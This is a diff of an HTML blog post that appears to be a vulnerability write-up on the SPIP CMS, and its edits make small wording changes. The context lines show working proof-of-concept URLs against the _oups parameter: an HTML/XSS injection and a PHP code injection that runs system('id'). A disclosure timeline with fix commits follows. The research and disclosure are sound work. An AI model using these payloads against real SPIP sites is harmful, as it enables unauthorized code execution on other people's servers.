@@ -152,7 +152,8 @@ This allows us to see the result of our payload directly on the page.</p>
 <p><img src="/posts/rmrce/inj.png" alt="form"></p>
 <p>We can try to inject with <strong><code>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'&quot;&lt;h1&gt;inject here&lt;/h1&gt;</code></strong></p>
 <p><img src="/posts/rmrce/h1.png" alt="form"></p>
-<p>Damnnn, nice we have html injection.</p>
+<p>Damnnn, nice we have html/XSS injection.
+You know what that means ???</p>
 <p>Are you remember <a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">the Laluka&rsquo;s RCE ?</a>
 And if we try to reproduce the same thing on our injection. <strong><code>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'&quot;&lt;?php system('id');?&gt;</code></strong>.</p>
 <p><img src="/posts/rmrce/rcepoc.png" alt="form"></p>
@@ -172,7 +173,7 @@ And if we try to reproduce the same thing on our injection. <strong><code>http:/
 <p><strong>2022/07/12</strong> : New <a href="https://github.com/spip/SPIP/commit/d569096f346f54552ecf2b0f09c2880219288cb3">commit</a> on spip.</p>
 </li>
 <li>
-<p><strong>2022/07/12 at 1:13 AM</strong>: Report the RCE to spip.</p>
+<p><strong>2022/07/12 at 1:13 AM</strong>: Declaration of the RCE to SPIP.</p>
 </li>
 <li>
 <p><strong>2022/07/12 at 11:18 AM</strong>: First <a href="https://github.com/spip/SPIP/commit/31691fd689234b290db5f6c9cbae9aff06aca74a">commit</a> to fix the RCE.</p>
